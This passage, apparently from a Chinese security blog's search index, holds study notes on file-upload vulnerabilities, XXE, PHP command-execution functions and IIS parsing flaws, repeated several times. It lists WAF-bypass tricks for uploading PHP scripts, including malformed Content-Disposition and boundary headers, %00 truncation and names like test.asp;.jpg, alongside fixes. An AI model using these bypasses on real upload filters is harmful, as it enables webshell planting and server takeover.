浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#条件"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#使用方法"},{"categories":["hvv"],"content":"\r06-XXEXXE xml外部实体注入 1.原理XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载， 导致可加载恶意外部文件， 造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。 xxe漏洞触发的点往往是可以上传xml文件的位置， 没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 2.防御1、使用开发语言提供的禁用外部实体的方法。 2、PHP：libxml_disable_entity_loader(true); 3、过滤用户提交的XML数据 4、XML 解析库在调用时严格禁止对外部实体的解析 3.关键词：\u003c!DOCTYPE和\u003c!ENTITY，或者，SYSTEM和PUBLIC\r## 07-php命令执行\r#### 相关函数\r```\reval()\rassert\rpreg_replace()\rcreate_function()\rarray_map()\rcall_user_func()\rcall_user_func_array()\rarray_filter()\r```","date":"2023-11-17","objectID":"/hvv_owasptop10/:5:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#06-xxe"},{"categories":["hvv"],"content":"\r06-XXEXXE xml外部实体注入 1.原理XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载， 导致可加载恶意外部文件， 造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。 xxe漏洞触发的点往往是可以上传xml文件的位置， 没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 2.防御1、使用开发语言提供的禁用外部实体的方法。 2、PHP：libxml_disable_entity_loader(true); 3、过滤用户提交的XML数据 4、XML 解析库在调用时严格禁止对外部实体的解析 3.关键词：\u003c!DOCTYPE和\u003c!ENTITY，或者，SYSTEM和PUBLIC\r## 07-php命令执行\r#### 相关函数\r```\reval()\rassert\rpreg_replace()\rcreate_function()\rarray_map()\rcall_user_func()\rcall_user_func_array()\rarray_filter()\r```","date":"2023-11-17","objectID":"/hvv_owasptop10/:5:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#1原理-4"},{"categories":["hvv"],"content":"\r06-XXEXXE xml外部实体注入 1.原理XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载， 导致可加载恶意外部文件， 造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。 xxe漏洞触发的点往往是可以上传xml文件的位置， 没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 2.防御1、使用开发语言提供的禁用外部实体的方法。 2、PHP：libxml_disable_entity_loader(true); 3、过滤用户提交的XML数据 4、XML 解析库在调用时严格禁止对外部实体的解析 3.关键词：\u003c!DOCTYPE和\u003c!ENTITY，或者，SYSTEM和PUBLIC\r## 07-php命令执行\r#### 相关函数\r```\reval()\rassert\rpreg_replace()\rcreate_function()\rarray_map()\rcall_user_func()\rcall_user_func_array()\rarray_filter()\r```","date":"2023-11-17","objectID":"/hvv_owasptop10/:5:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#2防御-1"},{"categories":["hvv"],"content":"\r06-XXEXXE xml外部实体注入 1.原理XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载， 导致可加载恶意外部文件， 造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。 xxe漏洞触发的点往往是可以上传xml文件的位置， 没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 2.防御1、使用开发语言提供的禁用外部实体的方法。 2、PHP：libxml_disable_entity_loader(true); 3、过滤用户提交的XML数据 4、XML 解析库在调用时严格禁止对外部实体的解析 3.关键词：\u003c!DOCTYPE和\u003c!ENTITY，或者，SYSTEM和PUBLIC\r## 07-php命令执行\r#### 相关函数\r```\reval()\rassert\rpreg_replace()\rcreate_function()\rarray_map()\rcall_user_func()\rcall_user_func_array()\rarray_filter()\r```","date":"2023-11-17","objectID":"/hvv_owasptop10/:5:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#3关键词"},{"categories":["hvv"],"content":"HVV专题–中间件漏洞 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:0:0","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#"},{"categories":["hvv"],"content":"\r中间件：中间件（Middleware）又称为web服务器或web容器，是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。 常见的web中间件： IIS Apache Tomcat Nginx Jboss Weblogic WebSphere ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:1:0","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#中间件"},{"categories":["hvv"],"content":"\r常见中间件漏洞：","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:0","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#常见中间件漏洞"},{"categories":["hvv"],"content":"\r0x1 IISIIS（Internet Information Services），即互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面。 1、PUT漏洞IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。 版本： IIS6.0 **修复方法：**关闭WebDAV 和写权限 2、短文件名猜解IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。 修复方法： 1）升级.net framework 2）修改注册表禁用短文件名功能 快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，需要重启系统生效 3）CMD关闭NTFS 8.3文件格式的支持 4）将web文件夹的内容拷贝到另一个位置，如c:\\www到d:\\w,然后删除原文件夹，再重命名d:\\w到c:\\www。 3、远程代码执行在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。 修复方法： 1）关闭 WebDAV 服务 2） 使用相关防护设备 4、解析漏洞IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。 /test.asp/test.jpgtest.asp;.jpg 第一种是新建一个名为 “test.asp” 的目录，该目录中的任何文件都被 IIS 当作 asp 程序执行（特殊符号是 “/” ） 第二种是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行 IIS7.5 文件解析漏洞 test.jpg/.php URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，而 php 又默认开启 “cgi.fix_pathinfo”, 会对文件进行 “ 修理 ” 即当 php 遇到路径 “/aaa.xxx/bbb.yyy” 时，若 “/aaa.xxx/bbb.yyy” 不存在，则会去掉最后的 “bbb.yyy” ，然后判断 “/aaa.xxx” 是否存在，若存在，则把 “/aaa.xxx” 当作文件。 若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。 修复方法： 1）对新建目录文件名进行过滤，不允许新建包含‘.’的文件 2）曲线网站后台新建目录的功能，不允许新建目录 3）限制上传的脚本执行权限，不允许执行脚本 4）过滤.asp/xm.jpg，通过ISApi组件过滤 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:1","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#0x1-iis"},{"categories":["hvv"],"content":"\r0x1 IISIIS（Internet Information Services），即互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面。 1、PUT漏洞IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。 版本： IIS6.0 **修复方法：**关闭WebDAV 和写权限 2、短文件名猜解IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。 修复方法： 1）升级.net framework 2）修改注册表禁用短文件名功能 快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，需要重启系统生效 3）CMD关闭NTFS 8.3文件格式的支持 4）将web文件夹的内容拷贝到另一个位置，如c:\\www到d:\\w,然后删除原文件夹，再重命名d:\\w到c:\\www。 3、远程代码执行在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。 修复方法： 1）关闭 WebDAV 服务 2） 使用相关防护设备 4、解析漏洞IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。 /test.asp/test.jpgtest.asp;.jpg 第一种是新建一个名为 “test.asp” 的目录，该目录中的任何文件都被 IIS 当作 asp 程序执行（特殊符号是 “/” ） 第二种是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行 IIS7.5 文件解析漏洞 test.jpg/.php URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，而 php 又默认开启 “cgi.fix_pathinfo”, 会对文件进行 “ 修理 ” 即当 php 遇到路径 “/aaa.xxx/bbb.yyy” 时，若 “/aaa.xxx/bbb.yyy” 不存在，则会去掉最后的 “bbb.yyy” ，然后判断 “/aaa.xxx” 是否存在，若存在，则把 “/aaa.xxx” 当作文件。 若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。 修复方法： 1）对新建目录文件名进行过滤，不允许新建包含‘.’的文件 2）曲线网站后台新建目录的功能，不允许新建目录 3）限制上传的脚本执行权限，不允许执行脚本 4）过滤.asp/xm.jpg，通过ISApi组件过滤 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:1","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#1put漏洞"},{"categories":["hvv"],"content":"\r0x1 IISIIS（Internet Information Services），即互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面。 1、PUT漏洞IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。 版本： IIS6.0 **修复方法：**关闭WebDAV 和写权限 2、短文件名猜解IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。 修复方法： 1）升级.net framework 2）修改注册表禁用短文件名功能 快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，需要重启系统生效 3）CMD关闭NTFS 8.3文件格式的支持 4）将web文件夹的内容拷贝到另一个位置，如c:\\www到d:\\w,然后删除原文件夹，再重命名d:\\w到c:\\www。 3、远程代码执行在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。 修复方法： 1）关闭 WebDAV 服务 2） 使用相关防护设备 4、解析漏洞IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。 /test.asp/test.jpgtest.asp;.jpg 第一种是新建一个名为 “test.asp” 的目录，该目录中的任何文件都被 IIS 当作 asp 程序执行（特殊符号是 “/” ） 第二种是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行 IIS7.5 文件解析漏洞 test.jpg/.php URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，而 php 又默认开启 “cgi.fix_pathinfo”, 会对文件进行 “ 修理 ” 即当 php 遇到路径 “/aaa.xxx/bbb.yyy” 时，若 “/aaa.xxx/bbb.yyy” 不存在，则会去掉最后的 “bbb.yyy” ，然后判断 “/aaa.xxx” 是否存在，若存在，则把 “/aaa.xxx” 当作文件。 若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。 修复方法： 1）对新建目录文件名进行过滤，不允许新建包含‘.’的文件 2）曲线网站后台新建目录的功能，不允许新建目录 3）限制上传的脚本执行权限，不允许执行脚本 4）过滤.asp/xm.jpg，通过ISApi组件过滤 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:1","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#2短文件名猜解"},{"categories":["hvv"],"content":"\r0x1 IISIIS（Internet Information Services），即互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面。 1、PUT漏洞IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。 版本： IIS6.0 **修复方法：**关闭WebDAV 和写权限 2、短文件名猜解IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。 修复方法： 1）升级.net framework 2）修改注册表禁用短文件名功能 快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，需要重启系统生效 3）CMD关闭NTFS 8.3文件格式的支持 4）将web文件夹的内容拷贝到另一个位置，如c:\\www到d:\\w,然后删除原文件夹，再重命名d:\\w到c:\\www。 3、远程代码执行在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。 修复方法： 1）关闭 WebDAV 服务 2） 使用相关防护设备 4、解析漏洞IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。 /test.asp/test.jpgtest.asp;.jpg 第一种是新建一个名为 “test.asp” 的目录，该目录中的任何文件都被 IIS 当作 asp 程序执行（特殊符号是 “/” ） 第二种是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行 IIS7.5 文件解析漏洞 test.jpg/.php URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，而 php 又默认开启 “cgi.fix_pathinfo”, 会对文件进行 “ 修理 ” 即当 php 遇到路径 “/aaa.xxx/bbb.yyy” 时，若 “/aaa.xxx/bbb.yyy” 不存在，则会去掉最后的 “bbb.yyy” ，然后判断 “/aaa.xxx” 是否存在，若存在，则把 “/aaa.xxx” 当作文件。 若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。 修复方法： 1）对新建目录文件名进行过滤，不允许新建包含‘.’的文件 2）曲线网站后台新建目录的功能，不允许新建目录 3）限制上传的脚本执行权限，不允许执行脚本 4）过滤.asp/xm.jpg，通过ISApi组件过滤 ","date":"2023-11-17","objectID":"/hvv_middleware_bug/:2:1","series":null,"tags":["hvv"],"title":"hvv_中间件漏洞","uri":"/hvv_middleware_bug/#3远程代码执行"},{"categories":["hvv"],"content":"\r0x1 IISIIS（Internet Information Services），即互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面。 1、PUT漏洞IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。 版本： IIS6.0 **修复方法：**关闭WebDAV 和写权限 2、短文件名猜解IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。 修复方法： 1）升级.net framework 2）修改注册表禁用短文件名功能 快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径： HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，需要重启系统生效 3）CMD关闭NTFS 8.3文件格式的支持 4）将web文件夹的内容拷贝到另一个位置，如c:\\www到d:\\w,然后删除原文件夹，再重命名d:\\w到c:\\www。 3、远程代码执行在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。 修复方法： 1）关闭 WebDAV 服务 2） 使用相关防护设备 4、解析漏洞IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。 /test.asp/test.jpgtest.asp;.jpg 第一种是新建一个名为 “test.asp” 的目录，该目录中的任何文件都被 IIS 当作 asp 程序执行（特殊符号是 “/” ） 第二种是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行 IIS7.5 文件解析漏洞 test.jpg/.php URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，而 php 又默认开启 “cgi.fix_pathinfo”, 会对文件进行 “ 修理 ” 即当 php 遇到路径 “/aaa.xxx/bbb.yyy” 时，若 “/aaa.xxx/bbb.yyy” 不存在，则会去掉最后的 “bbb.yyy” ，然后判断 “/aaa.xxx” 是否存在，若存在，则把 “/aaa.xxx” 当作文件。 若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” 